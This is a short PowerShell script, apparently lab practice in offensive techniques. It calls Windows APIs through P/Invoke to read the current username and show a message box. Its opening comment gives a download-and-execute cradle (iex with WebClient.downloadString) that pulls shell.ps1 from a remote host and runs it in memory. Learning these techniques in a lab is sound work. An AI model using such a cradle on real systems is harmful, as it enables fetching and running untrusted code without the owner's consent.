 # call with iex (new-object net.webclient).downloadString("http://192.168.49.71/shell.ps1")

$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@

$sig = @'
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
'@

Add-Type -MemberDefinition $sig -Namespace Advapi32 -Name Util

$size = 64
$str = New-Object System.Text.StringBuilder -ArgumentList $size

[Advapi32.util]::GetUserName($str,[ref]$size) |Out-Null
$str.ToString()

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
